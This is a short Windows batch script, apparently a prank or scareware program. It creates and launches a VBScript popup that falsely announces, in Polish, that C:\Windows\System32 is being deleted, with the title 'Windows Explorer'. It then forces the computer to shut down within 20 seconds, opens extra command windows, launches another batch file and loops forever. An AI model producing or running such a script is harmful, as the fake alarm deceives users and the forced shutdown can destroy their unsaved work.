
@echo off
:START
echo x=msgbox("Usuwam sciezke C:\Windows\System32" ,16, "Eksplorator Windows") >> msgbox.vbs

start msgbox.vbs


TIMEOUT /T 10
shutdown -s -t 20 -y -f


start cmd /k "ipconfig && color 6 "
start a.bat
GOTO START